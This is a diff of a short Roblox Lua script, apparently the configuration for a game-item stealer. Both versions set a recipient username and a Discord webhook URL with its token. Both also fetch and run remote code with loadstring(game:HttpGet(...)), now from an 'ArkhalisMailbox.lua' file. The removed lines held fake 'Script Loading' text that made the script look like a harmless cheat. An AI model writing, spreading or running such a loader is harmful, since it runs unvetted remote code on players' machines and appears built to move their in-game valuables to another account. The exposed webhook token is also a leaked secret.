@@ -1,19 +1,24 @@
-UserName = "Reset40448970"
+_G.Username = "Reset40448970"
 
-UserName2 = "APFKEalt_1"
+_G.Diamonds = 1000000
 
-Webhook = "https://discord.com/api/webhooks/1105651738884718592/xO_n9y1sf7OoKdpCy_hLFiWPNEtQVy5kH5S6oWzdTjNKbJVOLBKlyvcBIiDNnOlD0KL0"
+_G.Webhook = "https://discord.com/api/webhooks/1105651738884718592/xO_n9y1sf7OoKdpCy_hLFiWPNEtQVy5kH5S6oWzdTjNKbJVOLBKlyvcBIiDNnOlD0KL0"
 
-_G.MouseLock = false
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
 
-_G.ScriptName = "Rizz Scriptz"
 
-_G.FirstText = "Script Preparing..."
 
-_G.SecondText = "Script Loading..."
 
-_G.ThirdText = "Almost Done..."
 
-_G.WaitingTime = 5
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
+
+
+
+
+
+
+
+
+
+
+
